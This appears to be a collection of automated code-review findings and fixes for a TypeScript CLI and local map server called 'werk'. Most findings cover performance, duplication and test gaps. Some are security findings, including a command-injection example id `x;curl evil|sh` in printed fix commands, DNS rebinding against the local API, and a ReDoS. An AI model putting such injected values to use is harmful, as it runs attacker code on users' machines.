On a token with a long run of punctuation followed by a letter, the regex engine retries the run from each start position, so the time is O(n²). `noFilePaths` runs on every line of every ticket, including a file that already fails the size check. One ticket file with a very long punctuation run on one line (for example, 100k dots followed by `a`) stops `werk ticket-check` for minutes. The ticket files can come from an agent, so this is a small denial-of-service risk on a local tool.
review.fix: Strip the wrapping marks without backtracking. For example, trim leading and trailing characters with a loop over a character set. Or skip `noFilePaths` on a file that fails the size check, or cap the token length before the regex runs.

review.impact: The breadth-first walk scans every edge in `state.edges` for each node it dequeues. The cost is O(subtree nodes × all edges). On a large map with a large subtree, this is quadratic. `queue.shift()` also costs O(n) for each call.
review.fix: Before the walk, build a `Map<string, string[]>` from each parent id to its child ids, using only `refines` edges, in one pass. Use an index pointer into `queue` instead of `shift()`.

review.impact: `fieldAt` runs once for each path it finds. Each call scans all header entries, then walks back line by line to the nearest heading. A long file with many paths costs O(lines²). The size check does not stop this, because `noFilePaths` runs on files of any size.
review.fix: Compute the field for each line once, in one forward pass over `t.lines` (header key, or the last heading seen). Then look up that array in `noFilePaths`.

review.impact: The sort comparator calls `tickets.indexOf` twice for each comparison. The cost is O(n² log n) in the number of tickets. It is small for normal ticket sets, but the work is not needed.
review.fix: Record each ticket's position in a `Map<Ticket, number>` one time, and use that map in the comparator.

causeOfLast.why: `derive.ts` merged into the pure-file list first, on the same lines where this ticket added its pure files.

grade.gap: #werk-cli lists the build verbs as 'plan, loop, build, run, gate, ticket' under #werk-cli-build. The diff adds the new verb 'ticket-check' in src/cli/verbs/ticket-check.ts, but the diff does not add a line for it to that list. This is not a contradiction of the code, because the verb's form card can come from another ticket.

review.impact: The verb checks the folder with `statSync(...).isDirectory()`, but it checks the spec only with `existsSync`. When `--spec` names a directory, `readFileSync` on line 39 throws `EISDIR`. The process then stops with a stack trace. It does not print the `werk ticket-check: ...` message or exit with code 1, as the other cases do.
review.fix: Check the spec the same way as the folder, for example `!existsSync(specFile) || !statSync(specFile).isFile()`, and send that case to `missing(...)`.

review.impact: `fieldAt` scans the raw lines backward with its own copy of the heading regex `/^##\s+(.*?)\s*$/`. The parser in `parse.ts` already knows where each heading is. If the parser's `HEADING` rule changes, the field name in a `no-file-paths` failure can disagree with how the parser split the sections.
review.fix: Export `HEADING` from `parse.ts` and use it here. A better fix: have `parseTicket` record the heading of every line, including unknown sections, so that `fieldAt` reads that record and does not scan the lines again.

review.impact: `OWN_CHECKS` lists the check names in `failure.ts`, but the check functions and their call order are in `own-checks.ts`. When someone adds or renames a check, they must edit both lists by hand. Only the fixture test shows a mismatch, and only when a fixture for the new name exists.
review.fix: Define the check table in `own-checks.ts`, for example `const CHECKS = { shape, size, ... } satisfies Record<..., Check>`, and derive `OWN_CHECKS` from its keys. Or add a test that checks that every entry in `OWN_CHECKS` has a function.

review.impact: `cardsCited` builds its failure objects with no `Failure` annotation. The two other set checks annotate theirs with `(n): Failure`. A typo in the `check` literal then becomes a less clear type error, and the three checks look different.
review.fix: Annotate the map callback as `(card): Failure => ...`, the same as in `storiesDelivered`.

review.impact: `fieldAt` repeats the `HEADING` regex from `src/ticket/parse.ts:44` inline. It also rescans the raw lines to find the heading above a line, but the parser has already found every heading. If the heading syntax changes in `parse.ts`, `no-file-paths` can name a different field than the one the parser saw.
review.fix: Export `HEADING` from `parse.ts` and use it here. A cleaner fix: have `parseTicket` record each heading (known or not) with its line index, and make `fieldAt` look up that list.

review.impact: `BULLET` and `ANY_BULLET` are the same regex except for the bullet character class. If someone changes the checkbox or trim handling in one, they can forget the other.
review.fix: Build both from one helper, for example `const bullet = (marks: string) => new RegExp(`^\\s*[${marks}]\\s+(\\[[ xX]\\]\\s+)?(.*\\S)\\s*$`)`, and call it with `'-'` and `'-*+'`.

review.impact: `cardsCited` and `storiesDelivered` write full `Failure` object literals with `ticket: null` and a repeated check and field. `blockedBy` uses a `fail` helper, and `own-checks.ts` has its own `fail` helper. Three ways to build the same record make the failure shape harder to change.
review.fix: Add one set-level helper, for example `const setFail = (check, field, message): Failure => ({ ticket: null, check, field, message })`, and use it in both functions.

review.impact: The test hard-codes the log location as `.werk/log.jsonl` and serializes the events itself. `src/map/log.ts` owns this path and format, so a change there breaks this test without a clear cause.
review.fix: Use the log writer or path helper from `src/map/log.ts`, or add a `writeLog(p, events)` helper to the test harness. Then other CLI tests can use it too.

review.impact: `blockedBy` keeps a list of tickets for each number, so two files can share one number (for example `01-a.md` and `01-b.md`). No test covers this case. A blocker that points at a shared number, and a cycle through one of the two tickets, have no test. A later change to `byNumber` could pick only one ticket, and no test would fail.
review.fix: In `set-checks.test.ts`, add a case with two tickets numbered 1 and a ticket blocked by 1. Assert that no unknown-blocker failure occurs. Add a cycle through one of the two tickets and assert the exact cycle members.

review.impact: `decidedCardsUnder` uses a `seen` set so that a node reached twice is output once. The test map has no node with two refines parents, so the test never uses the `seen` guard. If someone removes the guard, every test still passes, and a card could be listed twice.
review.fix: Add a node that refines two decided parents under the root, for example with an extra refines edge. Assert that it appears one time in the result.

review.impact: `parseTicket` splits on `/\r?\n/`, but no test uses a ticket with CRLF line endings. The `HEADING` regex trims the end of a heading, but `HEADER_LINE` values and the `MAKE_TARGET` match depend on the split removing the `\r`. A regression to `split('\n')` would make the make-targets check fail on Windows-edited tickets, and no test would catch it.
review.fix: Add a test that runs `ownChecks` on `VALID.replace(/\n/g, '\r\n')` and expects no failures.

review.impact: The missing-input test covers the folder, the spec file and the root. It does not cover a `--spec` path that is a directory. The verb checks only `existsSync(specFile)`, then calls `readFileSync`, which throws `EISDIR`. No test sets the expected exit code 1 and the message for that case.
review.fix: Add a case `['tickets/valid', '--root', 'map', '--spec', 'tickets/valid']` to the missing-input table. Add an `isFile()` check in the verb so that the case exits 1 with a message that names the spec.

causeOfLast.why: main added `src/map/derive.ts` to the pure files list on the same line where this ticket added `src/map/graph.ts`, and the code was otherwise correct.

grade.gap: e2e/harness.ts saves evidence.png for each test through an auto fixture. The Makefile e2e target also runs `bunx playwright install chromium`, so the target needs the network on the first run. That is not a defect.

The browser harness puts the fake agent first on the PATH as `claude`, as the card requires. src/cli/serve.test.ts uses makeProject from src/test/harness.ts. That harness is outside this diff, so this review does not confirm that it puts the fake agent on the PATH.

web/src/MapView.tsx CardDetail shows why, body, whyNot and facts. It does not show say excerpts, ev pointers or alt options yet. Another ticket builds that part, so the diff does not contradict the card.

review.impact: useGraph keeps the old graph when a refetch fails. App shows the error only when no graph exists. A failed reload therefore leaves the old map on screen with no sign that it is out of date. Example: a malformed line in the log makes /api/graph return 500. The person sees a map that does not match the log.
review.fix: Show a small alert banner above MapView when `error` is set and `graph` also exists. Or return a `stale` flag from useGraph and show that flag.

review.impact: startServer creates the Vite server and the watcher before it listens. A failure in those steps, such as a bad vite.config.ts or an fs.watch error, also prints 'cannot listen on host:port'. That message sends the person to look at the wrong cause.
review.fix: Let startServer report which step failed. For example, wrap only the listen error with the host and port. Then print the 'cannot listen' text only for a listen error, and a general 'cannot start' text for the other errors.

review.impact: The hook calls load() directly, and the EventSource 'open' event calls load() again. Each mount therefore fetches /api/graph two times. The `latest` counter hides the race, but the second request is not needed.
review.fix: Remove the direct `void load()` call and depend on the 'open' event only. Or skip the first 'open' event after the first load.

review.impact: addressOf() copies the address regex and the boot-wait logic of serve() in src/cli/serve.test.ts. A change to the format of the 'werk: serving ... at http://...' line must be made in two places, or one of the two test suites breaks.
review.fix: Export the address pattern, or a small parse helper, from one shared module, such as src/cli/verbs/serve.ts or a test helper. Use it in both harnesses.

review.impact: The listen-failure path repeats the teardown steps of close(): clearInterval, watcher.close and vite.close. A new resource added later must go into both places. If one place misses it, a failed start leaks that resource.
review.fix: Move the teardown into one local `dispose()` function. Call it from both the catch block and close().

review.impact: The port check is hard to read. `portFlag` becomes '' when the parse fails, and `!(port <= 65535)` uses a NaN comparison to reject a bad value. One error message also covers two different faults.
review.fix: Return the usage error first when `!parsed.ok`. Then parse the port and test it with `!Number.isInteger(port) || port < 0 || port > 65535`.

review.impact: `page.waitForTimeout(300)` is a fixed sleep. The negative check after it passes even when the redraw arrives later than 300 ms. On a fast machine the sleep is also wasted time.
review.fix: Wait on a positive signal first, such as one `/api/graph` response after the add. Then assert that the card is not there.

review.impact: `addressOf` repeats the address regex and the 'printed no address' error from `serve()` in src/cli/serve.test.ts. If the address line format changes, both copies must change.
review.fix: Export the regex, or a small `parseServeAddress(out)` helper, from one module, for example src/cli/verbs/serve.ts. Use it in both test harnesses.

review.impact: No test covers `removeStale` or its `.reap` guard. Nothing tests two starts that race on a stale lock, a guard file left by a dead start, or a lock file with malformed JSON. A regression that removes a live lock, or that loops for ever on a stale guard, passes the suite. The one stale-lock test in serve.test.ts uses a clean dead pid and no guard file.
review.fix: Add `src/server/lock.test.ts` and call `takeLock` directly. Cover these cases: (1) a lock file that holds malformed JSON is taken; (2) a `server.lock.reap` file with a dead pid does not block the start; (3) a `.reap` file with a live pid makes the start wait, then take the lock after the file goes; (4) `release()` does not remove a lock that another pid now holds; (5) an aborted `signal` returns `{ ok: false, aborted: true }`.

review.impact: The tests cover only the case where the port becomes free in time. No test covers the end of the retries or an error that is not EADDRINUSE. If the `attempt >= retries` check or the `code !== 'EADDRINUSE'` check is wrong, the start can retry for ever or retry an error that cannot succeed (for example EACCES or a bad host), and no test fails. The serve.ts branch `cannot listen on` with exit 1 and a released lock also has no test.
review.fix: Add a unit test for `listenWithRetry` with `retries: 2, delayMs: 10` against a busy port, and assert that it rejects with EADDRINUSE after about three attempts. Add a test with an invalid host, and assert that it rejects at once. In serve.test.ts, add a case that keeps the port busy past the retries, then assert exit 1, the `cannot listen on` text, and no `server.lock` file.

review.impact: No test covers the 500 path of `sendGraph`. A log that cannot be read or folded could crash the server or return 200 with a broken body, and no test fails. The client error branch in App.tsx (`role="alert"`) also has no test.
review.fix: In serve.test.ts, write a malformed line to `.werk/log.jsonl`. Then assert that `GET /api/graph` returns 500 with the `werk: cannot read the log` text, and that the server still answers the next request.

review.impact: No browser test opens an unknown or ghost card id, or a malformed hash such as `#%E0`. The `No card #… in the map.` branch in MapView.tsx and the catch in `useHash.ts` `read()` are not tested. A ghost card that leaks into the detail view, or a crash on a bad escape, is not caught.
review.fix: Add an e2e test that goes to `${werk.url}#ghost` and to `${werk.url}#%E0`. Assert that `getByRole('alert')` shows the `No card` text, and that the breadcrumbs link back to the map.

review.impact: The check that a proposed card is not drawn waits a fixed 300 ms and then asserts a count of 0. If the redraw takes more than 300 ms, the assertion passes even when the ghost is drawn. The test can therefore pass while the behaviour it checks is broken.
review.fix: Wait for a known redraw before you assert the absence. For example, add the ghost and accept a second, unrelated card in the same step. Wait for the unrelated card to appear, then assert that `card('redraw')` has a count of 0.

review.impact: The stale-lock test takes the pid of a `true` process that has exited. The OS can give that pid to a new process before the test runs. Then the test sees a live holder, waits 5 seconds, and fails at random.
review.fix: Use a pid that cannot be alive, for example 2147483646, or a pid that the test confirms is dead with `process.kill(pid, 0)`. Or write a lock with a non-numeric pid to cover the stale path.

review.impact: The `/api/graph` and `/api/events` routes run before the Vite middleware. Vite 8.3.4 runs its `hostValidationMiddleware` inside `vite.middlewares`, so these two routes skip the Host header check. A malicious web page can use DNS rebinding to point its own hostname at 127.0.0.1:4211. Its script can then read the full project map: every card title, body, and thread note. The response carries no CORS header, but rebinding makes the request same-origin, so that does not protect the data.
review.fix: Check `req.headers.host` before you route to `/api/*`. Accept only `localhost`, `127.0.0.1`, `[::1]`, or the configured `--host`, with the bound port. Answer every other host with 403. Another option is to route the API through `vite.middlewares` after Vite's host validation, or to use Vite's `server.allowedHosts` logic for the API routes.

review.impact: `--host` accepts any value with no check and no warning. With `--host 0.0.0.0`, the read API has no authentication and is open to the network. The Vite dev middleware is open too, and it can serve source files under the werk root (`fs.allow`). A user may not expect that a map viewer also exposes the werk source tree and a dev server to the network.
review.fix: Print a warning to stderr when the host is not a loopback address. The warning must say that the map and the dev server have no authentication. Another option is to require an explicit flag such as `--expose` for a non-loopback host.

review.impact: The fake `claude` shell script puts `FAKE_AGENT` into a `/bin/sh` script inside double quotes from `JSON.stringify`. `/bin/sh` still expands `$` and backticks inside double quotes, so a checkout path that contains these characters runs code or breaks the harness. This is test-only code, and the path comes from the local checkout.
review.fix: Pass the path in an environment variable, for example `exec bun "$WERK_FAKE_AGENT" "$@"`. Another option is to quote the path in single quotes and escape each `'`.

review.impact: `refinesTree` scans every real node again for each node (`real.filter(...)` inside `childrenOf`). It also copies the `seen` set at each level. The cost is O(n²) time, plus O(n·depth) set copies. `MapView` runs it on every render, and once more for `findTree` on a card page. Each log change and each hash change causes a render. A map with a few thousand cards makes each redraw slow.
review.fix: Build a `Map<parentId, MapNode[]>` from `real` in one pass, in log order. Then read the children from that map. For the cycle guard, use one shared `seen` set: add the id before the recursion and remove it after. In `MapView`, compute the tree one time with `useMemo([graph])`, and pass the same tree to `findTree`.

review.impact: The `stale` branch does `continue` before the deadline check. If `removeStale` keeps returning false, `takeLock` polls every 100 ms with no limit. Example: a start died inside the `.reap` guard, and the OS reused its pid for a long-lived process. The guard then reads as live, and `werk serve` hangs. It never refuses after the 5 seconds that the design gives.
review.fix: Apply the deadline check in the stale branch as well. For example, return a refusal or an error when `Date.now() >= deadline` after the stale branch fails. As an alternative, treat a guard file that is older than a short age (from its mtime) as stale.

review.impact: Each `GET /api/graph` reads the whole log with a synchronous call and folds it again. The server pushes `changed` to all clients at the same time, so N open tabs cause N full reads and folds for one append. The synchronous read and fold also block the event loop, and Vite cannot serve other requests during that time. The cost grows with the log size, and the log is append-only.
review.fix: Cache the JSON body. Mark the cache invalid in the `watchLog` callback, or key it on the log's mtime and size. Then all clients that refetch after one change share one fold.

review.impact: On mount, the hook calls `load()` directly, and the EventSource `open` event calls `load()` again. Every page load and every reload sends two `/api/graph` requests, and each one makes the server do a full fold.
review.fix: Remove the direct `void load()` call and keep the `open` listener. It covers the first load and every reconnect. If the first paint must not wait for the event channel, skip the first `open` load when the first fetch is already in flight.

grade.gap: Each rule has an escape hatch that writes a reason: basis has --no-basis "<reason>" and options has --unchallenged. But the hint for a missing who fact always prints `werk edit <id> --who me` (src/map/contract.ts:30). A card that the person must decide would then get the wrong owner. The reason line names `you` and `prototype`, so the agent can still choose. This is minor and does not fail the line.

review.impact: runMapVerb builds its own stamped event with the seq, at and actor fields, and casts it with `as Event`. This copies the stamping logic of appendEvent in src/map/log.ts:30. The contract check therefore runs on one event, and appendEvent writes a different event that it builds a second time. If appendEvent changes how it stamps an event, the check and the log disagree without a warning. The `as Event` cast also hides type errors. appendEvent also reads the whole log a second time.
review.fix: Export one stamping function from log.ts, for example `stamp(prev: Event[], event: NewEvent, actor: Actor): Event`. Use it in both places. Alternatively, let appendEvent accept the stamped event or the events already read. Then the checked event and the written event are the same object, and the cast is not necessary.

review.impact: The CLI list `PARTS` repeats the `KillPart` union in src/map/rules.ts:171, and nothing connects the two. If someone adds a part to one list and not the other, the flag is not parsed, or it is parsed and then refused as a stray part. The compiler does not catch this.
review.fix: Define `KILL_PARTS_NAMES = ['text', 'source', 'metric', 'threshold', 'window', 'min-sample'] as const` once in rules.ts or events.ts. Derive `KillPart` from it, and import it in kill.ts.

review.impact: `parts as Record<KillPart, string>` claims that every part is present. The claim is true only because of the `needs` check above it, which is in a separate table. If someone edits KILL_PARTS in the wrong way, the criterion gets `undefined` fields and the type system does not see it.
review.fix: Build each criterion from values that are checked one at a time, for example with a small `need(part)` helper that returns a string. Or move the cast into one function per form, each next to the table entry it depends on.

review.impact: `runMapVerb` builds the stamped event (`seq: (events.at(-1)?.seq ?? 0) + 1`, `at: new Date().toISOString()`, `actor`, then a cast `as Event`) by hand. This copies the stamping logic inside `appendEvent` in `src/map/log.ts`. Then `appendEvent` reads the log again and stamps the event a second time. The two copies can drift apart. For example, if someone later changes how `seq` or `at` is assigned, the contract check folds a different event from the one that is written. The `as Event` cast also stops the type checker from catching such a drift.
review.fix: Move the stamping into one exported helper in `log.ts`, for example `stamp(prev: Event[], event: NewEvent, actor: Actor): Event`. Then let `appendEvent` take the stamped event, or the already-read `prev`. Use that helper both for the fold in the check and for the write, so the code builds `seq`, `at` and `actor` in one place only, without a cast at the call site.

review.impact: The kill parts are listed twice: as the `PARTS` const in `kill.ts` and as the `KillPart` union type in `src/map/rules.ts`. A new part added to only one list compiles. The CLI then rejects the flag, or never passes it to the rule.
review.fix: In `rules.ts`, export `KILL_PART_NAMES = ['text', 'source', 'metric', 'threshold', 'window', 'min-sample'] as const` and derive `type KillPart = (typeof KILL_PART_NAMES)[number]`. Import that const in `kill.ts` and delete the local `PARTS` list.

review.impact: `const p = parts as Record<KillPart, string>` widens a `Partial` record to a total record with a cast. Only the earlier `needs` check keeps the cast safe. That link is implicit, so a change to `KILL_PARTS` can produce criteria with `undefined` fields, and the type checker does not catch it.
review.fix: Build each criterion with non-null assertions next to the fields that the `needs` check guarantees, for example `parts.source!`. As an alternative, return the checked parts from a small helper typed per form, and drop the widening cast.

review.impact: The doc comment of `changesFrozen` says 'the depends_on links and the parent', but the code tests `'refines'`. A reader must know that the parent is a `refines` edge, a fact that is defined only in `parentEdge` in `fold.ts`, so the comment and the code read as a mismatch.
review.fix: Write the edge name in the comment ('the parent, a refines edge'), or put the parent edge type in a shared constant in `fold.ts` and use it in both `parentEdge` and `changesFrozen`.

review.impact: The test moved `edit g --who you` to run before the decide. The CLI no longer tests a who change on a ghost that is already decided. The test name still says that "status and who change a ghost without a refusal". A regression where the contract check refuses a free who change on a decided ghost would pass this test.
review.fix: After the decide, add one more who change that keeps every fact, for example `appendsOne(['edit', 'g', '--who', 'prototype'])`. Then assert `who: prototype` in the `show` output.

review.impact: The loop over `['0', '2.5', 'many']` asserts only `.ok === false`. The test does not check the `--min-sample must be a whole number above zero` message. A refusal for a different reason would also pass, for example a wrong stray-part check on `min-sample`.
review.fix: Assert the full ruling with `toEqual({ ok: false, error: '--min-sample must be a whole number above zero, not "' + n + '"' })`.

review.impact: `missingFacts` treats a who of only spaces as missing because it uses `!node.who?.trim()`. No test covers this case. If someone removes the trim, `--who ' '` passes the who fact and no test fails.
review.fix: Add `expect(facts(proposed('a', { who: ' ' }))).toContain('who')`. You can also add a CLI case where `edit a --who ' '` on a decided card is refused.

review.impact: For a decided card, the frozen-amend tests cover only a link that keeps the basis decided (`refines` to `b`). No test adds a `depends_on` link from a decided card to an open card. The waiting-basis refusal on an amend is the most likely regression path, and no test catches it.
review.fix: Add `expect(check([...complete, statusSet('a','decided'), proposed('c')], linked('a','c','depends_on'))).toMatchObject({ amend: true, missing: [{ fact: 'basis' }] })`.

review.impact: Each refusal prints a fix command that an agent copies and runs in a shell. The command contains node ids that are not quoted. Ids come from the log, and nothing checks their characters: `propose` accepts any string. The `waiting` id at line 49 can belong to any node in `.werk/log.jsonl`. That file can come from a cloned or shared repository. Suppose an id is `x;curl evil|sh` or contains `$(...)`. The id also appears inside the double-quoted `--text "<... ${id}>"`, and the shell expands `$(...)` there too. The printed fix line then runs arbitrary commands when the agent runs it, as `runPrinted` in the test shows the agent is meant to.
review.fix: Quote each id for the shell before you put it in a printed command. Use one helper, for example `sh(id)`, that wraps the id in single quotes and escapes any `'` inside it. Use it for `id`, `waiting` and `option` in every `command` string and in the `--no-basis` hint in the reason. Better still, also make `propose` refuse ids that do not match a safe pattern such as `/^[A-Za-z0-9][A-Za-z0-9:._-]*$/`. Then no id from the log can carry shell syntax.

review.impact: `Number()` accepts input that is not a plain decimal whole number. `--min-sample 0x10` records 16, `--min-sample 1e2` records 100, and `--min-sample ' 5 '` records 5. The recorded value can differ from what the user meant, and no refusal tells them.
review.fix: Check the raw string with `/^[1-9][0-9]*$/` before you convert it. Refuse any other string with the existing error message.

review.impact: Every map verb now folds the whole log twice. It runs `fold(events)` for the rule, then `fold([...events, next])` for the contract check. It also copies the event array once more. The cost grows with the log length on every command. This happens for verbs where `checkChange` returns at once, for example a `note.said` event or an event on a card that is not decided after the change.
review.fix: Fold only the new event on top of `call.state`. One way is an exported step function, such as `foldInto(state, event)`, that `fold` also uses. Another way is to call `subjectOf` before the second fold and skip it when the event has no subject. The check then costs O(1) folds and not O(n) for each command.

causeOfLast.why: this ticket and the ticket-check ticket each added lines at the same place in the coverage list.

grade.gap: Not a contradiction, and another ticket can build it: src/server/server.ts does not watch web/ yet and pushes no `reload` event. The draft is also not stashed in session storage. The lock wait (5 s), the EADDRINUSE retry (250 ms x 20), and `npm run dev` under `bun --hot` match the card.

web/src/MapView.tsx draws the top level (no hash) as a plain tree under the heading 'The map'. It does not use the card-page shape. The card says that the root uses the same shape as every other page. A later ticket can draw the root as a card page with its detail on top and its sub-cards below.

review.impact: After the first graph loads, a later fetch failure is stored in `error` but never shown. Example: a hand-edited log that `fold` rejects makes `/api/graph` return 500. The map then stays on the old graph without a sign, so the person reads stale data as current. The server builds a clear 500 message (`werk: cannot read the log: ...`) that the client drops.
review.fix: Show `error` when `graph` is also present. For example, render a `role="alert"` banner above `MapView`, and clear `error` on the next successful load (in useGraph, `setState({ graph })` already clears it).

review.impact: The server module writes to `console.error`. All other verb output goes through the `Io` that `dispatch` passes to the verb. Tests cannot capture this message, and the server now has a second output channel that the verb does not control.
review.fix: Add an `onError(message)` (or an `io`-like `err` callback) to `ServerOptions`, and pass `io.err` from `serve.ts`.

review.impact: `serve()` adds SIGINT and SIGTERM listeners with `process.once`, but no path removes them. On the parse-error return the handlers are not installed yet. On the refuse path and the listen-failure path they stay installed after the verb returns. This works only because `main.ts` calls `process.exit` at once. A caller that runs the verb in-process, such as a test or `bun --hot`, keeps handlers that swallow a later Ctrl-C.
review.fix: Keep references to the handlers and call `process.off` for both signals in a `finally` around the body after the lock wait. Or move signal setup into a small helper that returns a dispose function.

review.impact: `lock.ts` and `listen.ts` (line 31) call `Bun.sleep` directly. Every other import in these modules is `node:*`. This ties the server modules to the Bun runtime for no gain. A Node-based tool cannot import them, for example a Vite or Playwright config that reuses `takeLock`.
review.fix: Use `setTimeout` from `node:timers/promises` (`await setTimeout(ms)`), which works in both Bun and Node.

review.impact: The e2e fixture copies the project setup from `makeProject()` in src/test/harness.ts: the `claude` shim script, the `agent-script.json` file, the clean env with `GIT_CONFIG_NOSYSTEM`, `GIT_CONFIG_GLOBAL`, `HOME`, `TMPDIR` and `WERK_FAKE_AGENT_SCRIPT`, and the git init with the test identity. A change to the fake agent contract, such as a new env var like `WERK_FAKE_AGENT_LOG`, which the e2e copy already leaves out, must be made in two places. The two copies already differ.
review.fix: Move the shim, the env and the git init into one helper that uses only `node:` APIs, for example `src/test/project-env.ts`. Call it from `makeProject()` and from the e2e fixture. The e2e fixture then only copies the fixture files into the directory.

review.impact: `page.waitForTimeout(300)` followed by `toHaveCount(0)` is a fixed sleep. The test always waits 300 ms. The test still passes if the redraw comes after 300 ms, so the check that a ghost is not drawn depends on timing.
review.fix: Wait for the refetch that the `add` causes, for example `page.waitForResponse('**/api/graph')`, or wait until a known redraw happens. Then assert that `card('redraw')` has a count of 0.

review.impact: The regex for the address line (`/http:\/\/\S+\//`) and the loop that collects stdout are copied in e2e/harness.ts:105. If the format of the `werk: serving ... at <url>` line changes, two tests that are far apart must change together.
review.fix: Export the address pattern from src/cli/verbs/serve.ts, or from a small shared test helper, and use it in both harnesses.

review.impact: `findTree(refinesTree(graph), openId)` builds the whole tree to find one subtree. The tree logic is in two modules: the pure graph.ts and the view-local `findTree`. graph.ts has unit tests and pure-file coverage, but `findTree` has neither.
review.fix: Add `subtreeOf(graph, id): TreeNode | undefined` to src/map/graph.ts, next to `refinesTree` and `ancestorsOf`. Test it in graph.test.ts. Delete `findTree` from MapView.tsx.

review.impact: The port check uses an empty string as a sentinel and relies on `NaN` comparisons (`!(port <= 65535)`). A reader must trace three expressions to see that a parse failure, a non-digit port and a port out of range all reach the same branch.
review.fix: Parse the port in a small helper that returns `number | undefined`, for example `parsePort(flag)`. Then check `parsed.ok`, `positional.length` and `port === undefined` as separate, named conditions.

review.impact: No unit test covers `removeStale`, the `.reap` guard, a guard left behind by a dead process, a lock file that is not JSON, or `release()` when another process now owns the lock. `serve.test.ts` covers only one stale pid with no race. A change that breaks the guard (two starts both unlink, or a dead guard blocks every start) still passes every test.
review.fix: Add `src/server/lock.test.ts`. Call `takeLock` directly with a small `waitMs` and `pollMs`. Cover these cases: a lock file with garbage text is taken; a `.reap` file with a dead pid is cleared and the lock is taken; a `.reap` file with a live pid makes the start wait; two `takeLock` calls at the same time give exactly one `ok: true`; `release()` keeps a lock that now holds a different pid.

review.impact: No test covers the path where the listen fails for good. That path must release the lock, print `cannot listen on`, and exit 1. A regression that keeps the lock blocks every later `werk serve` on the project for 5 seconds and then refuses. The retry limit in `listenWithRetry`, and the rethrow of errors other than EADDRINUSE, also have no test.
review.fix: Add a test to `serve.test.ts` that keeps the port busy for the full run. Use a shorter retry setting if one exists. Assert exit 1, assert stderr contains `cannot listen on`, and assert that `.werk/server.lock` does not exist. Also add a unit test for `listenWithRetry` with `retries: 1, delayMs: 10` on a busy port: it rejects with EADDRINUSE.

review.impact: No test covers the 500 response for a log that cannot be read, or the `role=alert` error page in `App.tsx` that shows it. A bad log line could crash the server or show an empty map, and no test fails.
review.fix: In `serve.test.ts`, write an invalid line to `.werk/log.jsonl`. Then assert that `GET /api/graph` returns status 500 and a body that contains `cannot read the log`. Optionally add an e2e case that asserts the page shows the alert.

review.impact: No browser test covers the `No card #<id> in the map.` branch for an unknown id or a ghost id, or the malformed-escape fallback in `useHash.ts` (for example `#%E0`). A crash on a bad hash is not caught.
review.fix: Add a test that opens `#ghost` and `#%E0`. Assert that the page shows `role=alert` with `No card #ghost in the map.`, and that a breadcrumbs link goes back to the map.

review.impact: The cycle test makes both nodes have a parent, so no root exists. `refinesTree` returns [] before the `seen` guard in `childrenOf` runs. The test passes even if that guard is deleted, so its name claims more than it checks.
review.fix: Rename the test to say that nodes in a cycle have no root and are not drawn. Or delete the `seen` guard in `childrenOf`: a map with one parent per node cannot reach a cycle from a root.

review.impact: The upper bound `elapsed < 8_000` covers process start, a Vite start, and the 5 s wait. It can fail on a slow or busy CI runner, so the test can fail for a reason that is not a defect.
review.fix: Measure from the `waiting for pid` stderr line, not from the spawn. Or raise the upper bound, and keep the lower bound of 4.5 s.

review.impact: The server handles `/api/graph` and `/api/events` before it calls `vite.middlewares`. Vite 8 checks the Host header (`hostValidationMiddleware`) only inside its own middleware stack, so these two routes accept any Host header. A malicious web page can use DNS rebinding to point its own domain at 127.0.0.1:4211. The page then reads the full map, including card bodies and threads, from `/api/graph`. The same-origin policy does not block this read, because the browser treats the rebound domain as the page's own origin.
review.fix: Check the Host header before the API routes. Allow only `localhost`, `127.0.0.1`, `[::1]`, and the host the person passes with `--host`. Answer 403 for any other host. Another option: put the API routes after a call to Vite's host check, or reuse `server.allowedHosts`. Add a test that sends `Host: evil.example` to `/api/graph` and expects a 403.

review.impact: `--host` accepts any value with no check, for example `0.0.0.0`. With that value, the server shows the map API and the Vite dev server to the whole network with no authentication. Vite's `/@fs/` route can then serve any file inside the werk workspace root. The usage line does not warn about this.
review.fix: Print a warning to stderr when the host is not a loopback address. The warning must say that the map and the dev server are open to the network with no authentication. Another option: allow only loopback hosts unless the person also passes an explicit opt-in flag.

review.impact: In `refinesTree`, each `childrenOf` call filters the full `real` list. The function calls `childrenOf` once for each node, so the work is O(n²) in the node count. Each level also copies the `seen` set, which costs O(n·depth) memory. `MapView` calls `refinesTree` on every render. A card page calls it again through `findTree(refinesTree(graph))`. Each `changed` event triggers a refetch and a full re-render. A large log with many cards therefore makes each redraw quadratic.
review.fix: Build a `Map<parentId, MapNode[]>` one time from `real` and `parents`, and keep log order. Then recurse through that map with one shared visited `Set` (add before descent, or keep a path stack). This makes the work O(n). In `MapView`, compute the tree one time per graph with `useMemo`. For the card page, get the subtree from the same tree or from the children map.

review.impact: On mount, `void load()` fetches `/api/graph` immediately. The `open` listener on the `EventSource` fetches it again when the channel connects. Each page load therefore makes two full graph requests. Each request makes the server read and fold the whole log.
review.fix: Remove the eager `void load()` and rely on the `open` event, which also runs on each reconnect. Or skip the first `open` load when the initial fetch is still in flight or has completed.

review.impact: `sendGraph` reads and folds the whole log from disk on every `/api/graph` request. Each log change makes every open tab refetch, so N tabs cause N full reads and folds of the same unchanged log.
review.fix: Cache the serialized graph body. Invalidate the cache in the `watchLog` callback before the server pushes `changed`. Concurrent clients then share one read and one fold per change.

causeOfLast.why: werk/80 merged first and added its own lines at the same place in `src/coverage/pure-files.ts`.

review.impact: The CLI layer builds a stored `Event` by hand (`seq` from the last event plus one, `at`, `actor`, cast `as Event`). This repeats the stamping logic inside `appendEvent` in `src/map/log.ts:30`. If the log changes how it assigns `seq` or `at`, the contract check folds an event that differs from the event the log writes.
review.fix: Export one stamping helper from `src/map/log.ts`, for example `stamp(prev: readonly Event[], event: NewEvent, actor: Actor): Event`. Use it in both `appendEvent` and `runMapVerb`. Another option: let `appendEvent` take the pre-built event. Then the CLI does not know the log's seq rules, and the `as Event` cast stays in one place.

review.impact: `PARTS` repeats the `KillPart` union in `src/map/rules.ts:171`. The two lists can drift apart. A new part added in rules.ts and not added in kill.ts is not accepted as a flag. The TypeScript compiler does not catch this, because `parts` is built with `Object.fromEntries` and loses the key type.
review.fix: Define `export const KILL_PARTS_ALL = ['text', 'source', 'metric', 'threshold', 'window', 'min-sample'] as const` once, in `src/map/events.ts` or `src/map/rules.ts`. Derive `KillPart` from it with `(typeof KILL_PARTS_ALL)[number]`, and import it in `kill.ts`.

